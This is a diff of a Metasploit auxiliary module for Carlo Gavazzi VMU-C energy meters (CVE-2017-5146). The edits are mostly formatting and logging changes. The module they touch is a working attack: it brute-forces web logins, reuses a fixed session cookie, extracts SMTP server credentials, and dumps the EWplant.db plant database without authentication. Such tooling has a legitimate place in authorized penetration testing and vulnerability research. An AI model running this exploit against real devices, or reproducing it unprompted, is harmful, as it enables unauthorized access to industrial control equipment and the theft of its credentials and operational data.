@@ -9,27 +9,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
-      'Description' => %{
-        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
-      },
-      'References' =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
+        'Description' => %q{
+          This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
+        },
+        'References' => [
           ['URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-012-03'],
           ['CVE', '2017-5146']
         ],
-      'Author' =>
-         [
-           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
-         ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions' =>
-         {
-           'SSL' => false,
-           'VERBOSE' => true
-         }))
+        'Author' => [
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+        ],
+        'License' => MSF_LICENSE,
+        'DefaultOptions' => {
+          'SSL' => false,
+          'VERBOSE' => true
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -59,12 +65,12 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/',
-          'method'    => 'GET'
+          'uri' => '/',
+          'method' => 'GET'
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
       return false
     end
 
@@ -75,10 +81,10 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if good_response
-      vprint_good("#{rhost}:#{rport} - Running Carlo Gavazzi VMU-C Web Management portal...")
+      vprint_good("#{Rex::Socket.to_authority(rhost, rport)} - Running Carlo Gavazzi VMU-C Web Management portal...")
       return true
     else
-      vprint_error("#{rhost}:#{rport} - Application is not Carlo Gavazzi. Module will not continue.")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Application is not Carlo Gavazzi. Module will not continue.")
       return false
     end
   end
@@ -115,7 +121,7 @@ class MetasploitModule < Msf::Auxiliary
   #
 
   def do_login(user, pass)
-    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - Trying username:#{user.inspect} with password:#{pass.inspect}")
 
     # Set Cookie - Box is vuln to Session Fixation. Generating a random cookie for use.
     randomvalue = Rex::Text.rand_text_alphanumeric(26)
@@ -124,9 +130,9 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/login.php',
-          'method'    => 'POST',
-          'headers'   => {
+          'uri' => '/login.php',
+          'method' => 'POST',
+          'headers' => {
             'Cookie' => cookie_value
           },
           'vars_post' =>
@@ -137,9 +143,8 @@ class MetasploitModule < Msf::Auxiliary
             }
         }
       )
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
       return :abort
     end
 
@@ -151,7 +156,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if good_response
-      print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
+      print_good("SUCCESSFUL LOGIN - #{Rex::Socket.to_authority(rhost, rport)} - #{user.inspect}:#{pass.inspect}")
 
       # Extract firmware version
       begin
@@ -165,7 +170,7 @@ class MetasploitModule < Msf::Auxiliary
           }
         )
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-        vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+        vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
         return :abort
       end
 
@@ -174,7 +179,7 @@ class MetasploitModule < Msf::Auxiliary
           fw_ver = res.body.match(/Ver. (.*)[$<]/)[1]
 
           if !fw_ver.nil?
-            print_good("#{rhost}:#{rport} - Firmware version #{fw_ver}...")
+            print_good("#{Rex::Socket.to_authority(rhost, rport)} - Firmware version #{fw_ver}...")
 
             report_cred(
               ip: rhost,
@@ -194,16 +199,15 @@ class MetasploitModule < Msf::Auxiliary
       begin
         res = send_request_cgi(
           {
-            'uri'       => '/setupmail.php',
-            'method'    => 'GET',
-            'headers'   => {
+            'uri' => '/setupmail.php',
+            'method' => 'GET',
+            'headers' => {
               'Cookie' => cookie_value
             }
           }
         )
-
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-        vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+        vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
         return :abort
       end
 
@@ -218,15 +222,15 @@ class MetasploitModule < Msf::Auxiliary
           smtp_pass = dirty_smtp_pass.match(/[$"](.*)[$"]/)
 
           if (!smtp_server.nil?) && (!smtp_user.nil?) && (!smtp_pass.nil?)
-            print_good("#{rhost}:#{rport} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
+            print_good("#{Rex::Socket.to_authority(rhost, rport)} - SMTP server: #{smtp_server}, SMTP username: #{smtp_user}, SMTP password: #{smtp_pass}")
           end
         end
       else
-        vprint_error("#{rhost}:#{rport} - SMTP config could not be retrieved. Check if the user has administrative privileges")
+        vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - SMTP config could not be retrieved. Check if the user has administrative privileges")
       end
       return :next_user
     else
-      print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
+      print_error("FAILED LOGIN - #{Rex::Socket.to_authority(rhost, rport)} - #{user.inspect}:#{pass.inspect}")
     end
   end
 
@@ -243,20 +247,20 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - HTTP Connection Failed...")
       return :abort
     end
 
     if res && res.code == 200
-      print_status("#{rhost}:#{rport} - dumping EWplant.db")
-      print_good("#{rhost}:#{rport} - EWplant.db retrieved successfully!")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - dumping EWplant.db")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - EWplant.db retrieved successfully!")
       loot_name = 'EWplant.db'
       loot_type = 'SQLite_db/text'
       loot_desc = 'Carlo Gavazzi EM - EWplant.db'
-      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)
-      print_good("#{rhost}:#{rport} - File saved in: #{path}")
+      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body, loot_desc)
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - File saved in: #{path}")
     else
-      vprint_error("#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
       return
     end
   end
